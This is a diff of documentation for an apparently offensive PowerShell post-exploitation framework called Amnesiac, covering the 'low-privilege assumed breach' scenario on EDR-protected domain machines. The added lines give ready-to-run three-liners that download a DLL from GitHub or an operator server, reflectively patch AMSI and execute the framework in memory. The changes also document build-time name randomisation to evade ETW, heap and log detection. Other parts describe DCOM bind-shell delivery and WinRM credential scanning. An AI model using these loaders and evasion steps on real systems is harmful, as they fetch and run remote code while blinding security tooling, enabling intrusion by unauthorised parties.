@@ -46,19 +46,32 @@ Amnesiac detects the network logon token (`runas /netonly` creates a Type-9 NewC
 ### Scenario 2 — Low-Privilege Assumed Breach (Domain-Joined, EDR-Protected)
 Operator has obtained a **low-privilege shell on a domain-joined machine** running Windows Defender and a corporate EDR (e.g., CrowdStrike Falcon). The operator runs Amnesiac on THIS compromised machine to enumerate, exploit, and move laterally.
 
-**Loading approach — iex in-memory bootstrap:**
+**Loading approach — 3-liner in-memory bootstrap (preferred, stronger against EDR):**
 
-AMSI scans scripts at download time, so a one-liner AMSI bypass must run first in the current PS process, then Amnesiac is pulled entirely into memory via `iex` — nothing written to disk.
+`AmnesiacLoader.dll` is loaded as raw bytes via `[Reflection.Assembly]::Load()` — AMSI never scans binary bytes loaded this way. The DLL's `Bypass` class then patches AMSI via pure .NET reflection before Amnesiac is downloaded. Nothing written to disk.
+
+Use the `bootstrap` command in Amnesiac's local shell to get the exact current 3-liner with randomized names. The static version below is for the current build:
 
 ```powershell
-# Step 1: AMSI bypass one-liner (any working technique for the target environment)
-# <amsi-bypass-one-liner>
+# Line 1: load AmnesiacLoader.dll from GitHub Releases as raw bytes (AMSI never scans this)
+$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('https://github.com/0xSiarheiStar/Amnesiac/releases/download/v1.0-al/eXciQ2Lokx.dll'))
+# Line 2: call PatchAmsiReflection() via reflection — AMSI blind in this PS process
+$_a.GetType('eXciQ2Lokx.nsUwTvotvj').GetMethod('Nrfb7fybpR').Invoke($null,$null)
+# Line 3: now load Amnesiac — AMSI can't scan it
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1');Amnesiac
+```
 
-# Step 2a: load from operator HTTP server (preferred — no outbound GitHub from target network)
-iex (New-Object Net.WebClient).DownloadString('http://<operator-IP>:8080/Amnesiac_ShellReady.ps1'); Amnesiac
+**With operator HTTP server on network (preferred — no outbound GitHub from target):**
+```powershell
+$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<operator-IP>:8080/eXciQ2Lokx.dll'))
+$_a.GetType('eXciQ2Lokx.nsUwTvotvj').GetMethod('Nrfb7fybpR').Invoke($null,$null)
+iex (New-Object Net.WebClient).DownloadString('http://<operator-IP>:8080/Amnesiac_ShellReady.ps1');Amnesiac
+```
 
-# Step 2b: load from operator's fork on GitHub if operator server not available
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1'); Amnesiac
+**PS-only fallback (weaker — use if DLL unavailable):**
+```powershell
+# Run any option [1]-[4] from 'bootstrap' command, then:
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1');Amnesiac
 ```
 
 Once loaded into memory, all existing stealth features handle the rest — bypasses active in every generated payload, all tool delivery over the named pipe, no disk writes.
@@ -111,6 +124,7 @@ Four improvement layers, all changes in `Amnesiac.ps1`:
 | `winrmscan username=<dom\user> password=<pass> [range=10.x.x.1-30]` | Scan a host range for WinRM-accessible targets for the given credential. TCP-probes port 5985 first, then WSMan auth test. |
 | `dcom computername=<IP> [method=ShellWindows\|ShellBrowserWindow\|MMC20]` | Deliver bind shell via DCOM. ShellWindows/ShellBrowserWindow require no local admin — piggyback on existing `explorer.exe` (DCOM Access permission, allowed for domain users). Needs active interactive session on target + `serve` running. MMC20 requires local admin. **Note:** returns `0x80070005` when called from a non-domain-joined machine (runas /netonly) — DCOM activation is rejected at the class factory level regardless of credentials. Only reliable from a domain-joined operator machine or an existing pipe session. |
 | `servelog` | Print the serve request log (timestamped 200/404 lines, coloured by status) |
+| `bootstrap` | Scenario 2: print all AMSI bypass options + complete GitHub 3-liner and local-server 3-liner with current build's randomized names |
 
 ### LPE Commands (local shell + active sessions)
 
@@ -215,12 +229,38 @@ Scenario 2: iex (DownloadString); Amnesiac   (blob already embedded in ShellRead
 **Auto-loader guard:** If `$AmnesiacLoaderB64` is empty when a session connects with AutoLoader ON, a warning is printed instead of silently skipping: `[!] Auto-loader: blob not embedded — run AmnesiacLoader\Build.ps1 first`. Same warning is shown when typing `autoloader on` with an empty blob.
 
 ### Name Randomization (Build-Time)
-Every `Build.ps1` run randomizes the namespace, all public class names (Stomper, Injector, NativeLoader), all public method names, and all internal class names using word-boundary regex substitution on temp source copies before compiling. The compiled DLL is named `<random>.dll`. A PS-side name map block (`# !!AL-MAP-BEGIN!! ... # !!AL-MAP-END!!`) is written to both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1` containing `$_alNs`, `$_alStp`, `$_alConc`, `$_alInj`, `$_alInPS`, `$_alSpwn`, `$_alNL`, `$_alNLLd`. All pipe commands that invoke loader methods use PS reflection with these map variables — the target never sees `AmnesiacLoader`, `Stomper`, or `ConcealLoadedAssembly`.
+Every `Build.ps1` run randomizes the namespace, all public class names (Stomper, Injector, NativeLoader, Bypass), all public method names, and all internal class names using word-boundary regex substitution on temp source copies before compiling. The compiled DLL is named `<random>.dll`. A PS-side name map block (`# !!AL-MAP-BEGIN!! ... # !!AL-MAP-END!!`) is written to both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1` containing:
+
+| Variable | Maps to |
+|----------|---------|
+| `$_alNs` | Namespace |
+| `$_alStp` | Stomper class |
+| `$_alConc` | ConcealLoadedAssembly method |
+| `$_alInj` | Injector class |
+| `$_alInPS` | InjectUnmanagedPS method |
+| `$_alSpwn` | SpawnUnmanagedPS method |
+| `$_alNL` | NativeLoader class |
+| `$_alNLLd` | NativeLoader.Load method |
+| `$_alByp` | Bypass class (used in bootstrap 3-liner) |
+| `$_alPar` | PatchAmsiReflection method (used in bootstrap 3-liner) |
+
+All pipe commands and the `bootstrap` command use these variables — the target never sees `AmnesiacLoader`, `Stomper`, `Bypass`, or `PatchAmsiReflection`.
 
 Detection surfaces eliminated:
 - Named pipe command content (pipe scanners)
 - ETW AssemblyLoad events (assembly name = random)
 - CLR heap metadata (type/method name strings)
+- Bootstrap 3-liner — no static class/method name strings visible in PS history or logs
+
+### GitHub Releases Hosting
+The compiled DLL is also uploaded to GitHub Releases (`v1.0-al`) so Scenario 2 targets with internet access can load it without an operator HTTP server. After every `Build.ps1` run that will be used in an engagement:
+
+```powershell
+# Upload new DLL to GitHub Releases (replace old asset)
+gh release upload v1.0-al AmnesiacLoader\bin\<ns>.dll --clobber
+```
+
+The `bootstrap` command automatically uses `$_alNs` to construct the correct GitHub Releases URL — always matches the current build.
 
 ---
 
